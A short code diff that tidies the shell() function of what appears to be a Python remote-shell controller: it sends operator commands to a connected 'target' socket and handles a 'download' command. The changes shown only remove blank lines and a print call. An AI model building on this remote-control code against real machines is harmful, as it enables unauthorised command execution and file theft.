@@ -4,8 +4,6 @@
 import socket
 import base64 
  
- 
- 
 def shell():
     current_dir = target.recv(1024)
     count = 0
@@ -18,7 +16,6 @@ def shell():
             target.send(comando)
             res = target.recv(1024)
             current_dir = res
-            print(res)
         elif comando == "":
             pass
         elif comando[:8] == "download":
